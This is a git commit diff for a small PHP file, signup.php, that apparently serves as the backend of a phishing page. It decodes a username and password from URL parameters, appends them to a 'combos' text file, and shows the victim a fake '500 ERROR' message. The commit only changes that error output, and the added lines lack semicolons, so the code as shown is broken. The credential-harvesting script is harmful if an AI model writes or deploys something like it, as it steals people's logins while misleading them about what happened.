032369c16608361500815d09dc3bf027b2528e2b
IDKdir <121891047+IDKdir@users.noreply.github.com>
2023-01-03 12:53:58 -0500

    Update signup.php

--- signup.php
+++ signup.php
@@ -1,8 +1,9 @@
 <?php
 	$u = base64_decode(urldecode($_GET['u']));
 	$p = base64_decode(urldecode($_GET['p']));
+	$f = "500 ERROR"
 	$myfile = fopen("IDKspatk/combos[//RANDOM//].txt", "a") or die("50 ERROR");
 	fwrite($myfile, "\n". $u.' : '.$p);
 	fclose($myfile);
-	echo 500 ERROR;
+	echo $f
 ?>
